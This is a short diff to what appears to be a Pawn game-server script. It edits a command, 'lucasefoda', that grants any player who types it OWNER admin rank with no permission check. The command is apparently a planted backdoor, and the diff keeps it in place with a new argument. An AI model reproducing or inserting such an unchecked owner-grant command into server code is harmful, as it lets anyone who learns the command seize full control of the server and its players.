@@ -78,6 +78,6 @@ YCMD:creditos(playerid, params[], help)
 
 YCMD:lucasefoda(playerid, params[], help)
 {
-	PlayerData_SetAdmin(playerid, OWNER);
+	PlayerData_SetAdmin(playerid, OWNER, true);
 	return 1;
 }
